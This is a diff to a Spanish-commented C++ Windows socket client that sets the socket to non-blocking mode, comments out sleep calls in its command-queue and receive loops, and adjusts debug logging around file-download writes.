@@ -110,7 +110,7 @@ bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
         return false;
 	}
 
-    unsigned long int iBlock = 0;
+    unsigned long int iBlock = 1;
     if (ioctlsocket(this->sckSocket, FIONBIO, &iBlock) != 0) {
         __DBG_( "[X] No se pudo hacer non_block" );
     }
@@ -142,20 +142,18 @@ void Cliente::Process_Queue() {
             Paquete_Queue nTemp = this->queue_Comandos.front();
             this->queue_Comandos.pop();
             lock.unlock();
-            
             this->Procesar_Comando(nTemp);
-        }else {
-            std::this_thread::sleep_for(std::chrono::milliseconds(10));
         }
+        /*else {
+            std::this_thread::sleep_for(std::chrono::milliseconds(5));
+        }*/
         
     }
 
     std::unique_lock<std::mutex> lock(this->mtx_queue);
-    //Limpiar queue de tareas
     while (this->queue_Comandos.size() > 0) {
         this->queue_Comandos.pop();
     }
-    lock.unlock();
 
     __DBG_("[PQ] Done");
 }
@@ -173,9 +171,9 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             int iHeadsize = strIn[0].size() + 1;
             int iBytesSize = iRecibido - iHeadsize - 1; // -1 por el \0 agregado al armar el paquete
             const char* cBytes = paquete.cBuffer.data() + iHeadsize;
+            __DBG_("Ejcribiendoj");
             if (this->map_Archivos_Descarga[strIn[0]].ssOutfile.get()->is_open()) {
                 this->map_Archivos_Descarga[strIn[0]].ssOutfile.get()->write(cBytes, iBytesSize);
-                __DBG_("Ejcribiendoj");
                 this->map_Archivos_Descarga[strIn[0]].uDescargado += iBytesSize;
             }else {
                 _DBG_("[X] El archivo no esta abierto", GetLastError());
@@ -793,6 +791,7 @@ void Cliente::Procesar_Paquete(const Paquete& paquete) {
 //Loop principal
 void Cliente::MainLoop() {
     this->Spawn_QueueMan(); //spawn thread que lee el queue de los comandos
+    std::this_thread::sleep_for(std::chrono::milliseconds(500));
     DWORD error_code = 0;
     int ultimo_paquete = 0;
     std::vector<char> cBuffer;
@@ -818,6 +817,7 @@ void Cliente::MainLoop() {
 
         //Si se recibio un paquete completo
         if (iRecibido > 0) {
+            _DBG_("RECV:", iRecibido);
             struct Paquete nNuevo;
             if (this->m_DeserializarPaquete(cBuffer.data(), nNuevo, iRecibido)) {
                 ultimo_paquete = nNuevo.uiTipoPaquete;
@@ -825,9 +825,11 @@ void Cliente::MainLoop() {
             }else {
                 _DBG_("Error deserializando el paquete. Recibido:", iRecibido);
             }
-        }else {
-            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+            _DBG_("--_--:", iRecibido);
         }
+        /*else {
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+        }*/
 
     }
     
